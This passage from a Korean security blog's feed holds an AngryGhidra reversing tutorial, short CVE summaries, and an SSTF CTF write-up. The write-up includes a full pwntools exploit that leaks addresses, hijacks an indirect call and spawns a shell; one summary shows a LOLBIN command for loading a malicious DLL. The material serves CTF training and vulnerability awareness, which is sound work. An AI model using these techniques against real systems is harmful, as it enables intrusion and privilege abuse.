<span class="hljs-string">&#x27;AngryGhidra&#x27;</span>.&gt; GHIDRA_INSTALL_DIR is not defined!* Try:Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more <span class="hljs-built_in">log</span> output. Run with --scan to get full insights.* Get more <span class="hljs-built_in">help</span> at https://help.gradle.orgBUILD FAILED <span class="hljs-keyword">in</span> 3s</code></pre><p>그냥 빌드를 진행할 경우 기드라의 설치 경로를 알 수 없기 때문에 정상적으로 빌드가 되지 않습니다. 좀 더 똑똑한(?) 제가 가르쳐주도록 합니다.</p><pre><code class="hljs bash">~/AngryGhidra$ sudo GHIDRA_INSTALL_DIR=/home/idioth/ghidra_9.1.2_PUBLIC gradle buildExtension&gt; Task :buildHelp INFO  Using <span class="hljs-built_in">log</span> config file: jar:file:/home/idioth/ghidra_9.1.2_PUBLIC/Ghidra/Framework/Generic/lib/Generic.jar!/generic.log4j.xml (LoggingInitialization)  INFO  Using <span class="hljs-built_in">log</span> file: /root/.ghidra/.ghidra_9.1.2_PUBLIC/application.log (LoggingInitialization)  [JavaHelpFilesBuilder] Generating Help Files <span class="hljs-keyword">for</span>: [file:///home/idioth/AngryGhidra/src/main/<span class="hljs-built_in">help</span>/<span class="hljs-built_in">help</span>/][JavaHelpFilesBuilder] Generating map file: file:///home/idioth/AngryGhidra/build/<span class="hljs-built_in">help</span>/main/<span class="hljs-built_in">help</span>/AngryGhidra_map.xml...[JavaHelpFilesBuilder]  finished generating map file[JavaHelpFilesBuilder] Generating TOC file: AngryGhidra_TOC.xml...[JavaHelpFilesBuilder]  finished generating TOC file[JavaHelpFilesBuilder] Done generating <span class="hljs-built_in">help</span> files <span class="hljs-keyword">for</span> module: AngryGhidra&gt; Task :buildExtension Created ghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip <span class="hljs-keyword">in</span> /home/idioth/AngryGhidra/distBUILD SUCCESSFUL <span class="hljs-keyword">in</span> 15s8 actionable tasks: 8 executed</code></pre><p>위와 같이 자신의 기드라 경로를 추가해 준 후 빌드를 진행합니다. </p><pre><code class="hljs bash">~/AngryGhidra/dist$ lsghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip</code></pre><p>정상적으로 빌드가 진행됐다면 dist 폴더에 Extension 파일이 생깁니다.</p><p>여기까지 오셨다면 릴리즈를 통해 추가하는 것과 같은 방법으로 추가하시면 됩니다!</p><h2 id="AngryGhidra를-통한-문제-풀이"><a href="#AngryGhidra를-통한-문제-풀이" class="headerlink" title="AngryGhidra를 통한 문제 풀이"></a>AngryGhidra를 통한 문제 풀이</h2><p>angr로 푸는 문제 중 가장 간단한(?) <a href="https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/reverse/r100/r100.bin">Defcamp - r100</a>을 통해서 어떤 식으로 사용하는지 확인해봅시다.</p><p>먼저 기드라로 해당 파일을 열어준 후 main 소스 코드를 확인해봅시다.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_004007e8</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> iVar1;<span class="hljs-keyword">char</span> *pcVar2;undefined8 uVar3;<span class="hljs-keyword">long</span> in_FS_OFFSET;<span class="hljs-keyword">char</span> local_118 [<span class="hljs-number">264</span>];<span class="hljs-keyword">long</span> local_10;local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password: &quot;</span>);pcVar2 = fgets(local_118, <span class="hljs-number">0xff</span>, <span class="hljs-built_in">stdin</span>);<span class="hljs-keyword">if</span> (pcVar2 == (<span class="hljs-keyword">char</span> *)<span class="hljs-number">0x0</span>) &#123;uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;iVar1 = FUN_004006fd(local_118);<span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;put(<span class="hljs-string">&quot;Nice!&quot;</span>);uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Incorrect password!&quot;</span>);uVar3 = <span class="hljs-number">1</span>;&#125;&#125;<span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;__stack_chk_fail();&#125;<span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>password를 입력받고 <code>FUN_004006fd</code> 함수에서 어떠한 수행을 하고 return 값에 따라서 Nice와 incorrect로 넘어가네요.</p><p>Incorrect 부분을 피하고 Nice로 가는 패스워드를 찾아야 합니다.</p><p>저 함수를 일일이 분석하는 방법도 있지만 우리에게는 AngryGhidra가 있습니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img6.png"></p><p>먼저 함수의 시작 부분에서 blank state를 설정해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img7.png"></p><p>우리는 Nice 문자열 부분으로 넘어가는 값을 찾고 싶으니 Nice 쪽으로 넘어가는 주소를 Find Address로 설정해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img8.png"></p><p>Incorrect로 가는 부분은 피해야 되니 Avoid Address로 설정한 다음에 AngryGhidra를 실행해봅시다!</p><p><img src="/2020/10/25/idioth/angryghidra/img9.png"></p><p><img src="/2020/10/25/idioth/angryghidra/img10.png"></p><p>Window - AngryGhidraPlugin을 클릭하면 위의 사진과 같은 창이 뜹니다. 인자의 길이를 지정할 수도 있고, auto_load_libs를 설정할 수도 있습니다.</p><p>Blank State와 Find address, avoid address를 모두 설정하였으니 Run 버튼을 눌러 angr를 돌려봅시다.</p><p>잠시 기다려보면 Solution Found라고 뜨며 아래와 같이 어떤 문자열이 뜹니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img11.png"></p><p>나온 문자열을 바이너리에 입력해보면</p><pre><code class="hljs bash">~/Desktop$ ./r100.bin Enter the password: Code_TalkersNice!</code></pre><p>정상적으로 찾은 것을 알 수 있습니다.</p><p>나는 소스 코드 보고 클릭질만 몇 번 하면 값을 찾아준다? 정말 인간의 욕구에 충실한 플러그인이 아닐 수가 없습니다.</p><p>직접 스크립트를 작성해서 돌리는 것이 기능적으로는 훨씬 효율적일 수 있지만 리버싱을 진행하면서 바로바로 angr 환경 세팅 및 실행할 수 있다는 점이 매력적이었습니다.</p><p>아직은 간단한 것들로만 해보고 더 복잡한 것들은 사용해보지 않았는데 나중에 기회가 된다면 더 복잡한 바이너리에 사용해보고 올려보도록 하겠습니다 ㅋㅋ</p><p>오늘도 저의 멍청함을 확인하고 극복한 나에게 건배하며.. adios..</p><p align="center"><img src="./img12.jpg" width="50%" heightd="50%"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>ghidra</tag>
      
      <tag>angryghidra</tag>
      
      <tag>symbolic execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15999: Chrome 0-day, Heap buffer overflow</title>
    <link href="/2020/10/24/fabu1ous/2020-10-24/"/>
    <url>/2020/10/24/fabu1ous/2020-10-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://savannah.nongnu.org/bugs/?59308">Heap buffer overflow due to integer truncation in Load_SBit_Png</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome</p><p>Freetype</p><p>libpng</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020-10-21일 Chrome 긴급 패치가 릴리즈 됐습니다. CVE-2020-15999는 Chrome에서 폰트를 렌더링 할 때 사용하는 오픈소스 라이브러리 Freetype와 공식 PNG 라이브러리 libpng 사이에서 발생하는 이슈입니다. 각 라이브러리는 이미지로부터 32-bit integer크기의 width와 height값을 참조해 동작하는데, Freetype은 16-bit로 truncate(축소)한 뒤 bitmap 할당에 사용되는 size를 계산합니다. 이미지의 width와 height가 16-bit 보다 크다면 Freetype에서 할당된 bitmap이 실제 이미지보다 작겠죠? 이  bitmap을 libpng가 사용하면서 heap buffer overflow가 발생하게 됩니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>heap bof</tag>
      
      <tag>png</tag>
      
      <tag>freetype</tag>
      
      <tag>libpng</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Bypassing NTFS permissions to read any files as unprivileged user</title>
    <link href="/2020/10/23/l0ch/10-23_1day1line/"/>
    <url>/2020/10/23/l0ch/10-23_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/ioncodes/CVE-2020-16938">POC using Windows API calls</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 2004/Server 2004</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>권한이 없는 일반 사용자가 로컬 드라이브의 전체 데이터를 열람할 수 있는 취약점의 POC가 공개되었습니다.<br>해당 취약점은 최근 업데이트로 파티션, 볼륨 장치에 대한 권한이 변경되어 <code>\\.\PhysicalDrive0\</code>경로로 장치에 접근하면 권한을 우회해 arbitrary file read가 가능합니다. </p><p><img src="/2020/10/23/l0ch/10-23_1day1line/image1.png" alt="image1"></p><p>NTFS parser인 7zip으로도 arbitrary file read 가 가능합니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/jonasLyk/status/1316104870987010048">https://twitter.com/jonasLyk/status/1316104870987010048</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
      <tag>ntfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] GfxDownloadWrapper.exe LOLBIN을 이용한 Assembly Loading</title>
    <link href="/2020/10/22/idioth/gfxdownloadwrapper/"/>
    <url>/2020/10/22/idioth/gfxdownloadwrapper/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bohops.com/2020/10/21/exploring-an-assembly-loading-technique-and-detection-mechanism-for-the-gfxdownloadwrapper-exe-lolbin/">Exploring an Assembly Loading Technique and Detection Mechanism for the GfxDownloadWrapper.exe LOLBIN</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>GfxDownloadWrapper.exe는 인텔 비디오 카드 드라이버 소프트웨어로 인텔 그래픽 컨트롤 패널 및 게임 그래픽 설정을 지원하는 .NET 응용 프로그램입니다. 해당 파일은 “Microsoft Windows Third Party Component CA 2012”로 인증되어 있습니다. GfxDownloadWrapper.exe는 임의 다운로드를 방지하기 위한 루틴이 존재하지만 낮은 버전에서는 그러한 검증이 없습니다.</p><p><code>main()</code> 진입점에서 어셈블리를 로드하는 부분을 발견할 수 있으며 인자를 조작함으로써 영향을 미칠 수 있습니다.</p><ul><li>args[0]: “run”의 문자열 값</li><li>args[1]: 어셈블리 DLL 페이로드 경로</li><li>args[2]: 필수 어셈블리 method 숫자 문자열 값<ul><li>0: <code>ApplyRecommendedSettings</code>, 1: <code>RestoreRecommendedSettings</code>, 2: <code>CacheCleanup</code></li></ul></li><li>args[3]: <code>AppData</code> 상대 경로에 있는 게임 식별자 값</li></ul><pre><code class="hljs powershell">GfxDownloadWrapper.exe <span class="hljs-string">&quot;run&quot;</span> <span class="hljs-string">&quot;payload.dll&quot;</span> <span class="hljs-string">&quot;MethodNumber&quot;</span> <span class="hljs-string">&quot;;AppData\\Local\\Intel\\Games\\임의 값&quot;</span></code></pre><p>따라서 인자를 맞춰준 후 DLL 경로를 악성 dll로 지정하면 악성 어셈블리를 로드한 후 성공적으로 실행하게 됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>living of the land</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16902: Windows Installer EoP</title>
    <link href="/2020/10/21/fabu1ous/2020-10-21/"/>
    <url>/2020/10/21/fabu1ous/2020-10-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-windows-installer-elevation-of-privileges-vulnerability/">SSD Advisory – Windows Installer Elevation of Privileges Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows Installer</p><p><strong>Affected Versions</strong></p><ul><li>Windows 7</li><li>Windows 8</li><li>Windows 10</li><li>Windows 2008</li><li>Windows 2012</li><li>Windows 2016</li><li>Windows 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSD Secure Disclosure program에 제보된 CVE-2020-16902입니다. Windows Installer는 소프트웨어의 설치, 관리, 제거에 사용되는 Windows 컴포넌트입니다. <code>SetSecurity()</code>의 race condition 문제로 인해 Windows installer는 패치와 패치 우회가 반복되고 있습니다. 지금 소개하는 CVE-2020-16902도 마찬가지입니다.</p><p>Windows Installer는 설치 스크립트를 실행하면서 두 가지 작업을 추가로 병행합니다. 설치 작업의 실패를 대비해 roll back script (<code>.RBS</code>)를 작성하고, 설치 작업 중 삭제되는 모든 파일들을 복제해 c:\Config.Msi에 저장합니다. <code>.RBS</code>를 작성하기 전에 특정 루틴을 거치는데, 아래와 같습니다.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> Config.Msi 속 임시파일들을 생성<span class="hljs-number">2.</span> Config.Msi 삭제<span class="hljs-number">3.</span> Config.Msi 존재 여부 확인<span class="hljs-number">4.</span> Config.Msi 생성</code></pre><p>3번 과정에서 Config.Msi 디렉토리가 여전히 존재한다면 <code>SetSecurity()</code>를 사용하는 코드가 실행되며 기존 취약점(CVE-2020-1302)이 그대로 다시 악용될 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>local</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>system privilege</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Discord Desktop app RCE</title>
    <link href="/2020/10/20/l0ch/Discord_RCE/"/>
    <url>/2020/10/20/l0ch/Discord_RCE/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mksben.l0.cm/2020/10/discord-desktop-rce.html">Discord Desktop app RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Discord Desktop app</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>node.js 기반 오픈소스 프레임워크인 Electron으로 개발된 Discord에서 원격 코드 실행 취약점이 발견되었습니다. </p><p>Electron의 <code>BrowserWindow API</code> 옵션 중 코드 실행 컨텍스트를 분리하는 <code>contextIsolation</code> 옵션이 discord에서는 비활성화 돼있어 injection된 JS가 내부 페이지 코드 실행에 영향을 줄 수 있습니다. 이를 이용하면 iframe embed XSS 를 통해 JavaScript 내장 메소드를 재정의할 수 있으며 이때 Navigation restriction을 우회하면 iframe을 escape해 최상위 컨텍스트에서 임의 코드를 실행할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
      <tag>L0ch</tag>
      
      <tag>javascript</tag>
      
      <tag>context isolation</tag>
      
      <tag>discord</tag>
      
      <tag>electron</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16947: Outlook 365 Remote Command Execution</title>
    <link href="/2020/10/19/idioth/cve-2020-16947/"/>
    <url>/2020/10/19/idioth/cve-2020-16947/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0neb1n/CVE-2020-16947">CVE-2020-16947</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Outlook 365 apps for Enterprise/2016/2019</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook 365에서 메모리 객체에 대한 처리를 잘못하여 RCE가 가능한 취약점이 발견되었습니다.</p><p>HTML 콘텐츠에서 ASCII 범위 밖의 문자열을 복사할 때 해당 문자열들은 <code>0xfffd</code>로 교체됩니다. 따라서 복사된 문자열의 크기가 2배가 되기 때문에 src 버퍼와 dst 버퍼의 크기가 같아도 버퍼 오버플로가 발생하게 됩니다.</p><p>현재 이 취약점에 대한 자세한 기술적 설명과 exploit은 공개되지 않았습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>outlook</tag>
      
      <tag>idioth</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>memory corruption</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF eat-the-pie</title>
    <link href="/2020/10/18/fabu1ous/sstf-eat-the-pie/"/>
    <url>/2020/10/18/fabu1ous/sstf-eat-the-pie/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>뉴비부터 고수까지 모두 즐길 수 있는 CTF라는 소개글을 보고 대학 동아리 신입생들을 데리고 SSTF에 출전했습니다. 아쉽게도 좋은 성적을 내진 못했네요. 사실 이 write-up은 같이 출전한 신입생 친구들에게 보여주려고 작성했는데 몇 명이나 읽었을지…</p><p>CTF를 처음 경험하는 친구들이라 최대한 풀어서 설명을 적었으며, CTF에 대한 저의 견해도 조금씩 섞여 있습니다. eat-the-pie를 풀 당시 저의 사고 흐름을 중심으로 작성했고 이 글을 읽으실 때도 이점을 기억해주세요.</p><p>[ 취약점 ]</p><ol><li><p>Memory Leak With Printf</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="훑어보기"><a href="#훑어보기" class="headerlink" title="훑어보기"></a>훑어보기</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image1.png"></p><p><code>pwnme()</code>라는 이름의 함수가 있다. <del>“동네 사람들!!! 취약점 여기 있어요!!!”</del></p><p>CTF에서 이렇게 취약점의 위치를 알려주는 문제들은 주로 취약점은 간단하지만 exploit으로 연결시키는 것이 어려운 컨셉의 문제들입니다. eat-the-pie도 이런 컨셉의 문제인 거 같죠?</p><p><del>[ ! ] 심지어 문제 이름도 PIE 우회를 암시하고 있다.</del></p><p>대충 eat-the-pie 문제를 설명하자면,</p><ol><li>stack에 vtable을 만들고 <code>read()</code>로 입력을 받음.</li><li><code>read()</code>로 받은 입력 값을 이용해 vtable로부터 함수를 참조 실행.</li></ol><p>이 두 가지 정도만 알면 되는 간단한 프로그램입니다.</p><p>CTF 문제들은 의도적으로 취약점을 만들어 놨기 때문에 짱구를 조금만 굴려 보면</p><p>코드에서 많은 힌트를 얻을 수 있습니다. </p><p>[ ! ] Real world와 대조되는 큰 차이점이다.</p><p>위 사진에서 하이라이트 된 부분을 보고 최대한 많은 정보를 알아내 봅시다.</p><h1 id="취약점-예상-정적-분석"><a href="#취약점-예상-정적-분석" class="headerlink" title="취약점 예상 ( 정적 분석 )"></a>취약점 예상 ( 정적 분석 )</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image2.png"></p><ol><li>입력을 굳이 int가 아닌 string형으로 16 byte나 받는다.</li></ol><p>int( 4 byte )가 아닌 string으로 16 byte나 입력받는 것은 12 byte만큼 메모리를 낭비하는 것이고 입력받은 string을 int로 바꾸는 과정을 한번 더 걸치니 결코 합리적인 코드가 아닙니다. 즉, 취약점으로 빌드 업 되도록 의도된 코드인 거 같죠? <code>atoi()</code> 혹은 <code>printf()</code> 등 NULL terminated string 함수를 사용한다는 것도 중요한 정보인 것 같습니다.</p><ol start="2"><li>if문의 조건이 모든 경우의 수를 커버하지 못함.</li></ol><p>index를 이용해 참조하는 코드가 있다면 가장 먼저 확인해야 할 것이 있습니다. 바로, out-of-bound 가능 여부. 코드를 살펴보면 음수에 대한 예외 처리를 하지 않은 것을 알 수 있습니다. 심지어 indirect call에 사용되는 index의 out-of-bound네요.</p><p>그럼 대충 예상해 보면 취약점은 아래와 같습니다.</p><ol><li>NULL terminated string의 예외 처리 부재로 PIE 우회</li><li>out-of-bound로 eip 제어</li></ol><p>예상이 맞는지 한번 확인해 봅시다.</p><h1 id="Memory-Leak-with-printf"><a href="#Memory-Leak-with-printf" class="headerlink" title="Memory Leak with printf"></a>Memory Leak with printf</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image3.png"></p><p>PIE를 우회하는 법은 간단합니다. binary의 base address를 leak 하면 되니까요.</p><p>예를 들어 func1의 주소인 <code>0x5655574d</code>를 leak 했다면 <code>0x5655574d</code>에서 <code>func1</code>의 offset인 <code>0x74d</code>를 빼서 binary base address를 구할 수 있습니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image4.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image5.png"></p><p>16 byte 길이의 string을 입력하면 vtable 바로 위에 저장되는 것을 확인할 수 있습니다. 이 상태로 <code>printf()</code> 실행을 트리거하면 <code>func1 ~ func4</code>의 주소도 같이 출력됩니다. <code>printf()</code>는 NULL terminated string을 다루는 함수이기 때문에 NULL을 만나기 전까진 멈추지 않고 계속 출력한 결과입니다.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image6.png"></p><p>Indirect call에 사용될 인덱스에 따라 스택 상황을 출력한 사진에 번호를 새겨봤습니다. 좀 전에 indirect call에서 음수에 대한 예외 처리를 하지 않아 out-of-bound가 가능하다고 설명했습니다. 만약 현 상황에서 -3을 입력한다면 eip에 <code>0x42424242</code> 가 들어가겠죠?</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image7.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image8.png"></p><p>예상대로 취약점은 정말 간단합니다. 이제 exploit을 해봅시다.</p><h1 id="Exploit-Plan"><a href="#Exploit-Plan" class="headerlink" title="Exploit Plan"></a>Exploit Plan</h1><p>주어진 정보와 제약 상황 등을 고려하며 추가로 필요한 정보가 있는지 체크해봅시다.</p><ol><li><code>system()</code>을 바이너리에서 사용함.<ul><li>Arbitrary Write(AW)가 가능하다면 bss에 “/bin/sh”을 넣어주기만 하면 됨</li></ul></li><li>Libc 주소를 leak 하기 번거로움 </li><li>PIE가 있는 상황에서 stack 주소를 leak 하기 번거로움</li></ol><p>[ ! ] 결론</p><p>Arbitrary Write 할 방법을 찾자.</p><p>“/bin/sh”을 bss에 저장하고 <code>system( bss )</code>를 하면 쉘 획득 가능.</p><h1 id="Arbitrary-Write"><a href="#Arbitrary-Write" class="headerlink" title="Arbitrary Write"></a>Arbitrary Write</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image9.png"></p><p>Arbitrary Write(Write anything anywhere)를 하려면 당연히 쓰기 함수가 있어야 하겠죠?. 사용 가능한 쓰기 함수는 <code>read()</code>가 유일합니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image10.png"></p><p>out-of-bound로 <code>read()</code>를 AW에 사용하려는 지금 상황에서 넘어야 할 장애물이 2가지가 있습니다.</p><ol><li>call로 eip를 잡는다는 점</li><li><code>read()</code>는 인자를 3개나 받는다는 점</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image11.png"></p><p>일단 첫 번째, call로 함수를 호출하기 전에 충족돼야 하는 조건이 있는데,</p><ol><li>호출당하는 함수가 쓸 인자들이 stack에 push 돼 있어야 함.</li><li>ESP가 그 인자들 중 가장 낮은 주소에 위치해야 함.</li></ol><p>적절한 gadget을 사용한다면 이 두 가지 조건을 충족하는 것은 대부분 크게 어려운 일이 아닙니다. 하지만 pyload를 담을 메모리가 16byte 밖에 없기 때문에 이마저도 어려운 일이 돼 버렸네요.</p><p>[ ! ] indexVar + gadget + parameter1 + parameter2 + parameter3 + &amp;read() = 24 byte</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image12.png"></p><p>한참 고민하다가 한 가지 생각이 머리를 스치고 갔습니다.</p><p>“32 bit의 인자 push는 역순으로 이뤄진다!” <del>이때 이마를 탁 치고 유레카를 외쳤습니다.</del></p><p>결론부터 적자면 위 사진에서 하이라이트 된 부분을 gadget으로 사용하면 됩니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image13.png"></p><p>위 사진은 <code>pwnme()</code>에서 <code>read(0, &amp;v0, 0x10)</code>에 해당하는 어셈 코드입니다. 3번째 인자부터 역순으로 stack에 push 하는 게 보이시나요? 만약 3번째 인자를 push 하는 코드를 건너뛰고 <code>&lt;pwnme+198&gt;</code>부터 실행된다면 <code>read()</code>가 호출될 때 stack에 있던 쓰레기 값( <del>사실 ret addr</del> )을 <code>read()</code>의 3번째 인자로 인식하게 됩니다.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image14.png"></p><p>테스트해보면 예상과 같이 <code>read(0, &amp;v0, 0x566109bc)</code>가 실행됩니다. 이 가젯을 사용한다면 16 byte 입력 제한으로 불가능했던 AW가 가능해집니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;eat-the-pie.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)read_plt = e.plt[<span class="hljs-string">&#x27;read&#x27;</span>]system = e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]bss = e.bss()<span class="hljs-comment"># leak binary base</span>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">12</span> + <span class="hljs-string">&#x27;BBBB&#x27;</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;BBBB&#x27;</span>)leak = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x74d</span>log.info(hex(leak))<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>) <span class="hljs-comment"># read() in pwnme() without len</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># arbitrary write to bss</span>payload = p32(<span class="hljs-number">0</span>) + p32(leak+bss) + p32(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(leak+read_plt)p.sendline(payload)p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># system(&quot;/bin/sh&quot;);</span>payload = <span class="hljs-string">&#x27;AAAABBBBCCCC&#x27;</span>+ p32(leak+system) + p32(leak+<span class="hljs-number">0xa99</span>) + p32(leak+bss)p.sendline(payload) <span class="hljs-comment"># 0xa99 == pop pop pop ret</span>p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image15.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>calling convention</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF T-express</title>
    <link href="/2020/10/18/fabu1ous/sstf-t-express/"/>
    <url>/2020/10/18/fabu1ous/sstf-t-express/</url>
    
